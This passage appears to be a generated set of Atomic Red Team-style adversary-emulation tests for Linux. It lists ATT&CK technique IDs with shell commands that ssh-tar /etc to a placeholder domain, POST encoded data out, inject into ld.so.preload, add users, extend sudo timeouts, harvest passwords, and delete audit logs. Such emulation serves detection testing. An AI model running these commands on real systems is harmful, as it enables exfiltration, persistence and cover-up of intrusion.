ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1154 ,T1139 ,T1033 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1215 ,T1154 ,T1040 ,T1087 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1064 ,T1040 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1136 ,T1154 ,T1139 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1154 ,T1040 ,T1201 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1153 ,T1139 ,T1082 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1154 ,T1139 ,T1057 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1153 ,T1081 ,T1082 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1215 ,T1153 ,T1081 ,T1082 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1168 ,T1154 ,T1040 ,T1018 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1136 ,T1153 ,T1040 ,T1057 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1153 ,T1081 ,T1083 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1153 ,T1040 ,T1057 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1158 ,T1153 ,T1040 ,T1201 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
